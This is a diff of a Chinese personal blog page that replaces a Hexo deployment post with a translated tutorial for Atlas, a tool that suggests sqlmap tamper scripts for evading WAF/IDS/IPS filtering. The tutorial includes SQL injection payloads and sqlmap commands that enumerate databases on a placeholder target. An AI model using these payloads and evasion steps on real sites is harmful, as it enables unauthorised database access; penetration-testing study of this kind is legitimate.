@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>hexo上传博客 | 简爱个人博客</title>
-  <meta name="keywords" content=" hexo , 3-hexo ">
-  <meta name="description" content="hexo上传博客 | 简爱个人博客">
+  <title>sqlmap脚本建议 | 简爱个人博客</title>
+  <meta name="keywords" content=" kali , sqlmap ">
+  <meta name="description" content="sqlmap脚本建议 | 简爱个人博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="小男孩404页面 		 		 		 		 	 	 		 			 			 				返回首页 				咨询站长">
 <meta property="og:type" content="website">
@@ -308,9 +308,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-hexo上传博客" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-sqlmap绕waf" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">hexo上传博客</h1>
+        <h1 class="article-title">sqlmap脚本建议</h1>
     
     <div class="article-meta">
         
@@ -322,7 +322,7 @@
             
             <a  data-rel="工具">工具</a> > 
             
-            <a  data-rel="工具&lt;---&gt;hexo">hexo</a>
+            <a  data-rel="工具&lt;---&gt;sqlmap">sqlmap</a>
             
         </span>
         
@@ -330,21 +330,21 @@
         <span class="tag">
             <i class="iconfont icon-tag"></i>
             
-            <a class="color5">hexo</a>
+            <a class="color5">kali</a>
             
-            <a class="color2">3-hexo</a>
+            <a class="color2">sqlmap</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-            发布时间 : <time class="date" title='最后更新: 2020-11-17 13:23:19'>2020-11-16 20:39</time>
+            发布时间 : <time class="date" title='最后更新: 2020-11-17 16:05:57'>2020-11-17 15:44</time>
         
     </div>
     <div class="article-meta">
         
-        <span>字数:84</span>
+        <span>字数:338</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -363,7 +363,7 @@
     
     <div class="toc-ref">
     
-        
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Atlas-SQLMap-%E8%84%9A%E6%9C%AC-%E5%BB%BA%E8%AE%AEv1-0"><span class="toc-text">Atlas-SQLMap 脚本 建议v1.0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Screen"><span class="toc-text">Screen</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E8%A3%85"><span class="toc-text">安装</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%A8%E6%B3%95"><span class="toc-text">用法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90"><span class="toc-text">例子</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B0%E7%9A%84%E6%9B%B4%E6%96%B0%E8%8E%B7%E5%8F%96%E5%B0%86%E5%BE%88%E5%BF%AB%E4%BF%9D%E6%8C%81%E6%9B%B4%E6%96%B0"><span class="toc-text">新的更新获取将很快保持更新</span></a></li></ol></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -379,15 +379,36 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p><div class='inner-toc'></div>上传 github 博客</p>
-<p>一键上传</p>
-<pre><code>hexo clean &amp;&amp; hexo g &amp;&amp;  hexo d</code></pre>
-<p><div class='inner-toc'></div>拆解：</p>
-<pre><code>hexo clean   #清除缓存文件 (db.json) 和已生成的静态文件 (public)
-hexo g       #生成静态文件
-hexo d       #文件生成后立即部署网站
-&amp;&amp;           #后面接上要执行的命令</code></pre>
-<p><a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/docs/commands">hexo官方文档</a><br><a target="_blank" rel="noopener" href="http://yelog.org/2017/03/23/3-hexo-instruction/">叶落阁</a></p>
+        <p><a target="_blank" rel="noopener" href="https://github.com/m4ll0k/Atlas">原文</a></p>
+<h2 id="Atlas-SQLMap-脚本-建议v1-0"><a href="#Atlas-SQLMap-脚本-建议v1-0" class="headerlink" title="Atlas-SQLMap 脚本 建议v1.0"></a>Atlas-SQLMap 脚本 建议v1.0</h2><p><strong>Atlas</strong>是一个开放源代码工具，可以建议sqlmap篡改绕过WAF / IDS / IPS，该工具基于返回的状态码。</p>
+<p><img src="https://i.loli.net/2020/11/17/YjPmyrQOi5pwZDA.png"></p>
+<h2 id="Screen"><a href="#Screen" class="headerlink" title="Screen"></a>Screen</h2><p><img src="https://i.loli.net/2020/11/17/246qaQmpwACMgGP.png"></p>
+<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><pre><code>$ git clone https://github.com/m4ll0k/Atlas.git atlas
+$ cd atlas
+$ python atlas.py # python3+</code></pre>
+<h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><pre><code>$ python atlas.py --url http://site.com/index.php?id=Price_ASC --payload=&quot;-1234 AND 4321=4321-- AAAA&quot; --random-agent -v</code></pre>
+<p>注入点（带有 <code>%%inject%%</code>):</p>
+<p>get:</p>
+<pre><code>$ python atlas.py --url http://site.com/index/id/%%10%% --payload=&quot;-1234 AND 4321=4321-- AAAA&quot; --random-agent -v</code></pre>
+<p>post:</p>
+<pre><code>$ python atlas.py --url http://site.com/index/id/ -m POST -D &#39;test=%%10%%&#39; --payload=&quot;-1234 AND 4321=4321-- AAAA&quot; --random-agent -v</code></pre>
+<p>headers:</p>
+<pre><code>$ python atlas.py --url http://site.com/index/id/ -H &#39;User-Agent: mozilla/5.0%%inject%%&#39; -H &#39;X-header: test&#39; --payload=&quot;-1234 AND 4321=4321-- AAAA&quot; --random-agent -v</code></pre>
+<p>tampers concatenation(不知道咋翻译):</p>
+<pre><code>$ python atlas.py --url http://site.com/index/id/%%10%% --payload=&quot;-1234 AND 4321=4321-- AAAA&quot; --concat &quot;equaltolike,htmlencode&quot; --random-agent -v</code></pre>
+<p>get tampers list:</p>
+<pre><code>$ python atlas.py -g</code></pre>
+<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><ol>
+<li>Run SQLMap:</li>
+</ol>
+<pre><code>$ python sqlmap.py -u &#39;http://site.com/index.php?id=Price_ASC&#39; --dbs --random-agent -v 3</code></pre>
+<p><img src="https://i.loli.net/2020/11/17/dugNVQm1ThwAxCR.png"></p>
+<p><code>Price_ASC&#39;) AND 8716=4837 AND (&#39;yajr&#39;=&#39;yajr</code> 被WAF / IDS / IPS阻止，现在尝试使用Atlas：</p>
+<pre><code>$ python atlas.py --url &#39;http://site.com/index.php?id=Price_ASC&#39; --payload=&quot;&#39;) AND 8716=4837 AND (&#39;yajr&#39;=&#39;yajr&quot; --random-agent -v</code></pre>
+<p><img src="https://i.loli.net/2020/11/17/g3O6bwyJ8I9Wsnp.png"></p>
+<p>上图得到了建议的 tamper 脚本  “versionedkeywords”</p>
+<pre><code>$ python sqlmap.py -u &#39;http://site.com/index.php?id=Price_ASC&#39; --dbs --random-agent -v 3 --tamper=versionedkeywords,...</code></pre>
+<h4 id="新的更新获取将很快保持更新"><a href="#新的更新获取将很快保持更新" class="headerlink" title="新的更新获取将很快保持更新"></a>新的更新获取将很快保持更新</h4><p>$ BurpSuite</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证。邮箱：nc.nothing@gmail.com </span>
